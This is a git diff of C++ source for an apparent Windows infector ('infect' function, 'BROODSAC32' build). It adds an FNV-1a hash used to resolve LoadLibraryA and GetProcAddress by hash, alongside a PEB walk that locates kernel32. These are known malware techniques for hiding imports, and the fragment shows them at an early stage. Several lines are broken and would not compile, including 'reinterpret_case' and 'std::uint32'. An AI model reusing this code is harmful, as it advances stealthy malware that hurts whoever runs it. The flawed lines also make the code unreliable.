@@ -58,7 +58,23 @@ typedef struct FULL_LDR_DATA_TABLE_ENTRY
      LIST_ENTRY StaticLinks;
 } FULL_LDR_DATA_TABLE_ENTRY, *PFULL_LDR_DATA_TABLE_ENTRY;
 
-bool infect(void)
+std::uint32 fnv321a(const char *string)
+{
+   register std::uint32_t hashval = 0x811c9dc5;
+
+   if (string == nullptr)
+      return hashval;
+
+   while (*string != 0)
+   {
+      hashval ^= *string++;
+      hashval *= 0x01000193;
+   }
+
+   return hashval;
+}
+
+void infect(void)
 {
 #if defined(BROODSAC32)
    PPEB peb = reinterpret_case<PPEB>(__readfsdword(0x30));
@@ -87,6 +103,9 @@ bool infect(void)
 
    if (list_entry != nullptr)
       std::wcout << "found kernel32" << std::endl;
+
+   std::wcout << "LoadLibraryA: " << std::hex << fnv321a("LoadLibraryA") << std::endl;
+   std::wcout << "GetProcAddress: " << std::hex << fnv321a("GetProcAddress") << std::endl;
 }
 
 int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
